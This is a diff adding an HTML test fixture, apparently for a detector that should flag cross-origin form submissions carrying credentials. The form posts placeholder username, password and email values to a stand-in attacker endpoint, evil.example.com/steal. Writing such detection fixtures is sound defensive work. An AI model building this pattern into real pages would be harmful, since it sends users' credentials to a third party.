@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Cross-Origin Form Test</title>
+</head>
+<body>
+    <h1>Cross-Origin Form Submission</h1>
+    <p>This SHOULD trigger an alert (cross-origin submission with credentials)</p>
+
+    <form action="https://evil.example.com/steal" method="POST">
+        <label>Username: <input type="text" name="username" value="victim"></label><br>
+        <label>Password: <input type="password" name="password" value="secret123"></label><br>
+        <label>Email: <input type="email" name="email" value="victim@example.com"></label><br>
+        <button type="submit">Submit to Third Party</button>
+    </form>
+</body>
+</html>
